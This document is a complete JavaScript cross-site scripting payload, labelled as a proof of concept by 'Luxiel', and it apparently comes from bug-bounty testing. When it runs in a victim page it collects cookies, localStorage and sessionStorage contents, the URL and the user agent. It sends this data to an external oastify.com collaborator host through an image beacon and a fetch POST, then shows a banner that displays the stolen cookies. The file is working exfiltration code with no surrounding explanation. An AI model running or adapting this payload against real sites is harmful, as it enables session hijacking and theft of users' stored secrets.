(function(){
  var TAG='XSS_POC_LUXIEL',
      INTERACT='9s2rloi9fx4oypbxs5x8segei5owcm0b.oastify.com';
  function log(m){try{console.log('['+TAG+']',m);}catch(e){}}
  try{alert('XSS POC by Luxiel');}catch(e){log('alert blocked: '+e.message);}
  var exfil={
    tag:TAG,
    timestamp:new Date().toISOString(),
    domain:document.domain,
    location:window.location.href,
    referrer:document.referrer,
    userAgent:navigator.userAgent,
    title:document.title,
    cookies:document.cookie,
    localStorage:{},
    sessionStorage:{}
  };
  try{for(var i=0;i&lt;localStorage.length;i++){var k=localStorage.key(i);exfil.localStorage[k]=localStorage.getItem(k);}}catch(e){exfil.localStorageError=e.message;}
  try{for(var i=0;i&lt;sessionStorage.length;i++){var k=sessionStorage.key(i);exfil.sessionStorage[k]=sessionStorage.getItem(k);}}catch(e){exfil.sessionStorageError=e.message;}
  try{
    var exfilStr=JSON.stringify(exfil),
        b64=btoa(exfilStr),
        img=new Image();
    img.src='http://'+INTERACT+'/'+b64.substring(0,1800)
      +'?cookies='+encodeURIComponent(exfil.cookies||'').substring(0,1500)
      +'&amp;ls='+encodeURIComponent(Object.keys(exfil.localStorage).join(',')).substring(0,1500)
      +'&amp;v='+exfil.domain;
  }catch(e){log('img exfil err: '+e.message);}
  try{
    fetch('http://'+INTERACT+'/exfil',{
      method:'POST',
      mode:'no-cors',
      body:exfilStr.substring(0,8000),
      keepalive:true
    }).catch(function(){});
  }catch(e){}
  try{
    var el=document.createElement('div');
    el.id='luxiel-pwned';
    el.style.cssText='position:fixed;top:0;left:0;right:0;background:#cc0000;color:#fff;padding:20px;z-index:2147483647;font-family:monospace;font-size:13px;border-bottom:4px solid yellow;max-height:90vh;overflow:auto';
    var lsKeys=Object.keys(exfil.localStorage).join(', ');
    var html='';
    html+='&lt;div style="font-size:18px;font-weight:bold"&gt;XSS POC by Luxiel &mdash; arbitrary JS in &lt;code style="background:#000;color:#0f0;padding:2px 6px"&gt;'+document.domain+'&lt;/code&gt;&lt;/div&gt;';
    html+='&lt;div style="margin-top:10px"&gt;Cookies: &lt;pre style="background:#000;color:#fff;padding:10px;white-space:pre-wrap;word-break:break-all;margin:5px 0"&gt;'+(exfil.cookies||'(none)')+'&lt;/pre&gt;&lt;/div&gt;';
    html+='&lt;div&gt;localStorage ('+Object.keys(exfil.localStorage).length+' keys): &lt;pre style="background:#000;color:#fff;padding:10px;white-space:pre-wrap;word-break:break-all;margin:5px 0"&gt;'+(lsKeys||'(none)')+'&lt;/pre&gt;&lt;/div&gt;';
    html+='&lt;div&gt;Exfil destination: '+INTERACT+' (interactsh-client OOB)&lt;/div&gt;';
    html+='&lt;div style="margin-top:10px"&gt;&lt;button onclick="this.parentElement.remove()" style="background:#fff;color:#000;padding:5px 10px;border:none;cursor:pointer"&gt;Dismiss&lt;/button&gt;&lt;/div&gt;';
    el.innerHTML=html;
    (document.body||document.documentElement||document.head).appendChild(el);
  }catch(e){log('banner error: '+e.message);}
  log('PoC done. Exfil sent to interactsh: '+INTERACT);
})();
